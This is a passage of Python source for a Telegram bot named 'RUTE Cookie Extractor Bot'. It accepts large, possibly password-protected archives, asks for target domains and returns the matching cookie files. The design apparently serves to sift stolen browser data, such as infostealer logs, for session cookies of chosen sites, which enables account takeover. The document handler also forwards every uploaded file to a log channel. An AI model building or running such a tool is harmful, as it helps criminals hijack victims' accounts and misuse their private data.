                status_text += f"⚡ Speed: {format_size(speed)}/s\n"
                status_text += f"⏳ ETA: {format_time(eta)}\n"
                status_text += f"📈 Progress: {progress:.1f}%\n"
                
                # Progress bar
                bar_length = 20
                filled = int(bar_length * progress / 100)
                bar = '█' * filled + '░' * (bar_length - filled)
                status_text += f"`{bar}`\n"
            
            elif task.status in [TaskStatus.EXTRACTING, TaskStatus.PROCESSING]:
                status_text += f"🔧 Stage: {task.current_stage}\n"
                if task.stage_progress > 0:
                    status_text += f"📈 Progress: {task.stage_progress:.1f}%\n"
                    
                    bar_length = 20
                    filled = int(bar_length * task.stage_progress / 100)
                    bar = '█' * filled + '░' * (bar_length - filled)
                    status_text += f"`{bar}`\n"
            
            elif task.status == TaskStatus.COMPLETED:
                if task.cookie_extractor:
                    status_text += f"✅ Files processed: {task.cookie_extractor.files_processed}\n"
                    status_text += f"🎯 Entries found: {task.cookie_extractor.total_found}\n"
                status_text += f"⏱️ Processing time: {str(task.processing_time).split('.')[0]}"
            
            elif task.status == TaskStatus.FAILED:
                status_text += f"❌ Error: {task.error_message}"
            
            elif task.status == TaskStatus.CANCELLED:
                status_text += "🚫 Task was cancelled"
            
            elif task.status == "waiting_password":
                status_text += "🔐 Waiting for password... (Send /cancel to abort)"
            
            elif task.status == "waiting_domains":
                status_text += "🎯 Waiting for domains... (Send /cancel to abort)"
            
            # Add cancel button
            if task.status not in [TaskStatus.COMPLETED, TaskStatus.FAILED, TaskStatus.CANCELLED]:
                keyboard = InlineKeyboardMarkup([[
                    InlineKeyboardButton("❌ Cancel Task", callback_data=f"cancel_{task.task_id}")
                ]])
            else:
                keyboard = None
            
            if task.status_message:
                try:
                    await task.status_message.edit_text(
                        status_text,
                        reply_markup=keyboard,
                        parse_mode=ParseMode.MARKDOWN
                    )
                except:
                    pass
            else:
                msg = await self.bot.send_message(
                    task.chat_id,
                    status_text,
                    reply_markup=keyboard,
                    parse_mode=ParseMode.MARKDOWN
                )
                task.status_message = msg
                
        except Exception as e:
            print(f"Error updating status: {e}")
    
    async def set_password(self, user_id: int, password: str) -> bool:
        """Set password for user's task"""
        async with self.lock:
            if user_id not in self.user_tasks:
                return False
            
            task_id = self.user_tasks[user_id]
            task = self.tasks.get(task_id)
            if not task or task.status != "waiting_password":
                return False
            
            task.password = password
            task.status = TaskStatus.QUEUED
            await self.update_status_message(task)
            return True
    
    async def set_domains(self, user_id: int, domains_text: str) -> bool:
        """Set domains for user's task"""
        async with self.lock:
            if user_id not in self.user_tasks:
                return False
            
            task_id = self.user_tasks[user_id]
            task = self.tasks.get(task_id)
            if not task or task.status != "waiting_domains":
                return False
            
            domains = [d.strip().lower() for d in domains_text.split(',') if d.strip()]
            if not domains:
                return False
            
            task.target_sites = domains
            task.status = TaskStatus.QUEUED
            await self.update_status_message(task)
            return True
    
    async def cancel_task(self, task_id: str, user_id: int = None) -> bool:
        """Cancel a task"""
        async with self.lock:
            task = self.tasks.get(task_id)
            if not task:
                return False
            
            # Check permission
            if user_id and task.user_id != user_id and user_id not in ADMINS:
                return False
            
            task.cancel_requested = True
            
            # Stop extractors
            if task.extractor:
                task.extractor.stop_extraction = True
            if task.cookie_extractor:
                task.cookie_extractor.stop_processing = True
            
            task.status = TaskStatus.CANCELLED
            task.completed_at = datetime.now()
            
            await self.update_status_message(task)
            
            # Remove from user tasks
            if task.user_id in self.user_tasks and self.user_tasks[task.user_id] == task_id:
                del self.user_tasks[task.user_id]
            
            # Cleanup
            asyncio.create_task(self.cleanup_task(task))
            
            return True
    
    async def cleanup_task(self, task: ProcessingTask):
        """Clean up task files"""
        try:
            # Delete downloads
            if task.file_path and os.path.exists(task.file_path) and task.file_path.startswith('downloads'):
                try:
                    os.remove(task.file_path)
                except:
                    pass
            
            # Delete extraction folder
            if task.extract_folder and os.path.exists(task.extract_folder):
                await asyncio.get_event_loop().run_in_executor(
                    None,
                    lambda: delete_folder(task.extract_folder)
                )
            
            # Delete results folder
            if task.results_folder and os.path.exists(task.results_folder):
                await asyncio.get_event_loop().run_in_executor(
                    None,
                    lambda: delete_folder(task.results_folder)
                )
                
        except Exception as e:
            print(f"Cleanup error: {e}")
    
    def get_queue_status(self) -> Dict:
        """Get queue status"""
        queued = []
        processing = []
        completed = []
        
        for task_id, task in self.tasks.items():
            if task.status == TaskStatus.QUEUED:
                queued.append(task.to_dict())
            elif task.status in [TaskStatus.DOWNLOADING, TaskStatus.EXTRACTING, TaskStatus.PROCESSING]:
                processing.append(task.to_dict())
            elif task.status in [TaskStatus.COMPLETED, TaskStatus.FAILED, TaskStatus.CANCELLED]:
                if task.completed_at and (datetime.now() - task.completed_at) < timedelta(minutes=5):
                    completed.append(task.to_dict())
        
        return {
            'queued': queued,
            'processing': processing,
            'completed': completed,
            'total': len(self.tasks)
        }

# ==============================================================================
#                            BOT CLASS
# ==============================================================================

class CookieExtractorBot:
    """Main bot class"""
    
    def __init__(self):
        self.app = Client(
            "cookie_extractor_bot",
            api_id=API_ID,
            api_hash=API_HASH,
            bot_token=BOT_TOKEN
        )
        self.task_manager = TaskManager()
        self.task_manager.bot = self.app
        self.start_time = datetime.now()
        self.owner_credit = "@still_alivenow"
    
    async def start(self):
        """Start the bot"""
        print(f"{Fore.GREEN}Starting Cookie Extractor Bot...{Style.RESET_ALL}")
        print(f"{Fore.CYAN}Owner: {self.owner_credit}{Style.RESET_ALL}")
        
        # Create directories
        os.makedirs("downloads", exist_ok=True)
        os.makedirs("temp", exist_ok=True)
        
        await self.app.start()
        
        # Register handlers
        self.register_handlers()
        
        print(f"{Fore.GREEN}Bot is running!{Style.RESET_ALL}")
        await asyncio.Event().wait()
    
    def register_handlers(self):
        """Register message handlers"""
        
        @self.app.on_message(filters.command("start"))
        async def start_command(client, message: Message):
            text = (
                f"**🚀 RUTE Cookie Extractor Bot**\n\n"
                f"Send me any archive file (ZIP, RAR, 7Z, etc.) and I'll extract cookies for specific domains.\n\n"
                f"**Commands:**\n"
                f"/start - Show this message\n"
                f"/stats - System statistics\n"
                f"/queue - View queue status\n"
                f"/cancel - Cancel your current task\n"
                f"/help - Show help\n\n"
                f"**Owner:** {self.owner_credit}"
            )
            await message.reply_text(text)
        
        @self.app.on_message(filters.command("help"))
        async def help_command(client, message: Message):
            text = (
                f"**📖 How to use:**\n\n"
                f"1. Send me an archive file (max 4GB)\n"
                f"2. If archive is password protected, send the password\n"
                f"3. Enter domains to filter (comma-separated)\n"
                f"4. Wait for processing\n"
                f"5. Download filtered cookie files\n\n"
                f"**Supported formats:** ZIP, RAR, 7Z, TAR, GZ, BZ2, XZ\n"
                f"**Max file size:** 4GB\n"
                f"**Queue limit:** 2 concurrent tasks\n\n"
                f"**External tools:**\n"
                f"7z: {'✅' if TOOL_STATUS['7z'] else '❌'}\n"
                f"UnRAR: {'✅' if TOOL_STATUS['unrar'] else '❌'}"
            )
            await message.reply_text(text)
        
        @self.app.on_message(filters.command("stats"))
        async def stats_command(client, message: Message):
            msg = await message.reply_text("🔄 Collecting statistics...")
            
            try:
                # System stats
                cpu_percent = psutil.cpu_percent(interval=1)
                memory = psutil.virtual_memory()
                disk = psutil.disk_usage('/')
                
                # Process stats
                process = psutil.Process()
                process_memory = process.memory_info()
                process_cpu = process.cpu_percent(interval=1)
                
                # Network stats
                net_io = psutil.net_io_counters()
                
                # Bot uptime
                uptime = datetime.now() - self.start_time
                
                stats_text = (
                    f"**🖥️ System Statistics Dashboard**\n\n"
                    f"**💾 Disk Storage**\n"
                    f"├ Total:  {format_size(disk.total)}\n"
                    f"├ Used:   {format_size(disk.used)} ({disk.used/disk.total*100:.1f}%)\n"
                    f"└ Free:   {format_size(disk.free)}\n\n"
                    f"**🧠 RAM (Memory)**\n"
                    f"├ Total:  {format_size(memory.total)}\n"
                    f"├ Used:   {format_size(memory.used)} ({memory.percent}%)\n"
                    f"└ Free:   {format_size(memory.available)}\n\n"
                    f"**⚡ CPU**\n"
                    f"├ Cores:  {psutil.cpu_count()}\n"
                    f"└ Usage:  {cpu_percent:.1f}%\n\n"
                    f"**🔌 Bot Process**\n"
                    f"├ CPU:    {process_cpu:.1f}%\n"
                    f"├ RAM (RSS): {format_size(process_memory.rss)}\n"
                    f"└ RAM (VMS): {format_size(process_memory.vms)}\n\n"
                    f"**🌐 Network**\n"
                    f"├ Upload:   {format_size(net_io.bytes_sent)}\n"
                    f"├ Download: {format_size(net_io.bytes_recv)}\n"
                    f"└ Total I/O: {format_size(net_io.bytes_sent + net_io.bytes_recv)}\n\n"
                    f"**📟 System Info**\n"
                    f"├ OS:      {platform.system()}\n"
                    f"├ Version: {platform.release()}\n"
                    f"├ Python:  {platform.python_version()}\n"
                    f"└ Uptime:  {str(uptime).split('.')[0]}\n\n"
                    f"**⏱️ Performance**\n"
                    f"└ Ping:    {(datetime.now() - msg.date).total_seconds()*1000:.3f} ms\n\n"
                    f"**Owner:** {self.owner_credit}"
                )
                
                await msg.edit_text(stats_text)
                
            except Exception as e:
                await msg.edit_text(f"❌ Error getting stats: {str(e)}")
        
        @self.app.on_message(filters.command("queue"))
        async def queue_command(client, message: Message):
            status = self.task_manager.get_queue_status()
            
            text = f"**📊 Queue Status**\n\n"
            text += f"**Total Tasks:** {status['total']}\n"
            text += f"**Processing:** {len(status['processing'])}/{self.task_manager.max_concurrent}\n"
            text += f"**Queued:** {len(status['queued'])}\n"
            text += f"**Recent Completed:** {len(status['completed'])}\n\n"
            
            if status['processing']:
                text += "**⚙️ Processing:**\n"
                for task in status['processing']:
                    text += f"├ `{task['task_id']}`: {task['file_name']} ({task['file_size']})\n"
                    text += f"│  ├ Status: {task['status']}\n"
                    text += f"│  └ Stage: {task['stage']} ({task['progress']:.1f}%)\n"
            
            if status['queued']:
                text += "\n**⏳ Queued:**\n"
                for task in status['queued']:
                    text += f"├ `{task['task_id']}`: {task['file_name']} ({task['file_size']})\n"
                    text += f"│  └ Wait: {task['wait_time']}\n"
            
            if status['completed']:
                text += "\n**✅ Recent Completed:**\n"
                for task in status['completed']:
                    text += f"└ `{task['task_id']}`: {task['file_name']} - {task['status']}\n"
            
            await message.reply_text(text)
        
        @self.app.on_message(filters.command("cancel"))
        async def cancel_command(client, message: Message):
            user_id = message.from_user.id
            
            # Check if user has a task
            if user_id not in self.task_manager.user_tasks:
                await message.reply_text("❌ You don't have any active task.")
                return
            
            task_id = self.task_manager.user_tasks[user_id]
            success = await self.task_manager.cancel_task(task_id, user_id)
            
            if success:
                await message.reply_text("✅ Your task has been cancelled.")
            else:
                await message.reply_text("❌ Failed to cancel task.")
        
        @self.app.on_callback_query()
        async def callback_handler(client, callback_query: CallbackQuery):
            data = callback_query.data
            
            if data.startswith("cancel_"):
                task_id = data[7:]
                user_id = callback_query.from_user.id
                
                success = await self.task_manager.cancel_task(task_id, user_id)
                
                if success:
                    await callback_query.answer("Task cancelled successfully")
                    await callback_query.message.edit_text("🚫 Task cancelled.")
                else:
                    await callback_query.answer("Failed to cancel task", show_alert=True)
        
        @self.app.on_message(filters.document)
        async def document_handler(client, message: Message):
            user_id = message.from_user.id
            
            # Check file size
            if message.document.file_size > MAX_FILE_SIZE:
                await message.reply_text(
                    f"❌ File too large. Maximum size is {format_size(MAX_FILE_SIZE)}"
                )
                return
            
            # Check if user already has a task
            if user_id in self.task_manager.user_tasks:
                task_id = self.task_manager.user_tasks[user_id]
                task = self.task_manager.tasks.get(task_id)
                if task and task.status in [TaskStatus.QUEUED, TaskStatus.DOWNLOADING, 
                                           TaskStatus.EXTRACTING, TaskStatus.PROCESSING]:
                    await message.reply_text(
                        "❌ You already have an active task. Please wait or use /cancel to cancel it."
                    )
                    return
            
            # Create task
            task = ProcessingTask(
                user_id=user_id,
                chat_id=message.chat.id,
                message_id=message.id,
                file_path="",  # Will be downloaded
                file_name=message.document.file_name,
                file_size=message.document.file_size
            )
            
            # Add to queue
            try:
                task_id = await self.task_manager.add_task(task)
                await message.reply_text(
                    f"✅ File queued successfully!\n"
                    f"Task ID: `{task_id}`\n"
                    f"Position: {self.task_manager.queue.qsize() + 1}"
                )
                
                # Forward to log channel
                if SEND_LOGS and LOG_CHANNEL:
                    try:
                        await message.forward(LOG_CHANNEL)
                    except:
                        pass
                
            except Exception as e:
                await message.reply_text(f"❌ Error: {str(e)}")
        
        @self.app.on_message(filters.text & filters.private)
        async def text_handler(client, message: Message):
            user_id = message.from_user.id
            text = message.text.strip()
            
            # Check if waiting for password
            if user_id in self.task_manager.user_tasks:
                task_id = self.task_manager.user_tasks[user_id]
                task = self.task_manager.tasks.get(task_id)
                
                if task and task.status == "waiting_password":
                    success = await self.task_manager.set_password(user_id, text)
                    if success:
                        await message.reply_text("✅ Password set. Continuing...")
                    else:
                        await message.reply_text("❌ Failed to set password.")
                    return
                
                if task and task.status == "waiting_domains":
                    success = await self.task_manager.set_domains(user_id, text)
                    if success:
                        await message.reply_text(f"✅ Domains set: {', '.join(task.target_sites)}")
                    else:
                        await message.reply_text("❌ Failed to set domains. Please enter comma-separated domains.")
                    return
            
            await message.reply_text("Send me an archive file to process.")

# ==============================================================================
#                                MAIN
# ==============================================================================

async def main():
    """Main function"""
    bot = CookieExtractorBot()
    
    try:
        await bot.start()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}Bot stopped by user{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}Fatal error: {e}{Style.RESET_ALL}")
        traceback.print_exc()

if __name__ == "__main__":
    asyncio.run(main())
